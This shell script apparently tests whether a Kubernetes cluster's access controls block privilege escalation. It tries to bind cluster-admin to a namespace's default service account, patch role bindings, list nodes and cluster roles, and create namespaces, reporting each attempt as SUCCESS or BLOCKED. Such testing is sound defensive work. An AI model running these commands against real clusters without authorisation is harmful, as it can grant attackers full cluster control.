#!/bin/sh
set -eu

# Attempts to escalate RBAC privileges
# This simulates an attacker trying to gain cluster-admin or other high privileges

namespace="${1:-frontend}"

echo "[ATTACK] RBAC Privilege Escalation Attack"
echo "[INFO] Target namespace: $namespace"

# Step 1: Check current permissions
echo "[ATTACK] Checking current user permissions..."
kubectl auth can-i --list --namespace="$namespace" 2>/dev/null || echo "[INFO] Cannot check permissions"

# Step 2: Try to create cluster-admin role binding
echo "[ATTACK] Attempting to create cluster-admin role binding..."
kubectl create clusterrolebinding privilege-escalation-test \
    --clusterrole=cluster-admin \
    --serviceaccount="$namespace:default" 2>/dev/null && \
    echo "[SUCCESS] Cluster-admin role binding created!" || \
    echo "[BLOCKED] Cannot create cluster-admin role binding"

# Step 3: Try to patch existing role bindings
echo "[ATTACK] Attempting to modify existing role bindings..."
kubectl get rolebindings -n "$namespace" -o name 2>/dev/null | head -1 | while read rb; do
    if [ -n "$rb" ]; then
        echo "[ATTACK] Attempting to patch: $rb"
        kubectl patch "$rb" -n "$namespace" --type='json' \
            -p='[{"op": "add", "path": "/subjects/-", "value": {"kind": "ServiceAccount", "name": "default", "namespace": "'"$namespace"'"}}]' 2>/dev/null && \
            echo "[SUCCESS] Role binding patched!" || \
            echo "[BLOCKED] Cannot patch role binding"
    fi
done

# Step 4: Try to create a pod with cluster-admin service account
echo "[ATTACK] Attempting to create pod with elevated service account..."
kubectl run rbac-test-$(date +%s) \
    --image=busybox \
    --namespace="$namespace" \
    --serviceaccount=default \
    --restart=Never \
    --rm -i -- echo "test" 2>/dev/null && \
    echo "[SUCCESS] Pod created with service account" || \
    echo "[BLOCKED] Pod creation denied"

# Step 5: Try to access cluster-scoped resources
echo "[ATTACK] Attempting to access cluster-scoped resources..."
kubectl get nodes 2>/dev/null && echo "[SUCCESS] Can list nodes" || echo "[BLOCKED] Cannot list nodes"
kubectl get namespaces 2>/dev/null && echo "[SUCCESS] Can list namespaces" || echo "[BLOCKED] Cannot list namespaces"
kubectl get clusterroles 2>/dev/null && echo "[SUCCESS] Can list cluster roles" || echo "[BLOCKED] Cannot list cluster roles"

# Step 6: Try to create/delete namespaces
echo "[ATTACK] Attempting to create namespace..."
kubectl create namespace rbac-test-$(date +%s) 2>/dev/null && \
    echo "[SUCCESS] Namespace created!" || \
    echo "[BLOCKED] Cannot create namespace"

echo "[COMPLETE] RBAC privilege escalation attack finished"

